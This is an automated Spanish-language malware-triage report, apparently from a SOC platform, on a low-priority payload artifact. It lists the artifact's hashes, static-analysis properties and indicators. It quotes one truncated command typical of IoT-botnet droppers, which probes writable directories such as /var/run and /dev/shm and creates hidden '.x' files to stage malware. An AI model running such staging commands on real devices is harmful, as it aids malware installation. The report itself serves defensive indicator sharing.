# 🧬 Payload Analysis

`e115c62158410a7a98d47acfa7c22d080728b77e5155eb59d09d493504e683cf`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Info`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:50:14+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `e115c62158410a7a98d47acfa7c22d080728b77e5155eb59d09d493504e683cf`
- **SHA1:** `c77d4002828028dea9165245dbf879a645c0ba98`
- **MD5:** `fbfad7e6eac282d76e5854869b82d3fa`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 804 B |
| Entropía | 5.44 |
| Strings | 21 |

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=data; iocs=2

## 🖥️ Comandos observados / extraídos

```text
[4lcht@NAS326:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| hash | e115c62158410a7a98d47acfa7c22d080728b77e5155eb59d09d493504e683cf | static_analysis |
| command | [4lcht@NAS326:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/s | strings |
| ip | [internal-ip-redacted] | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
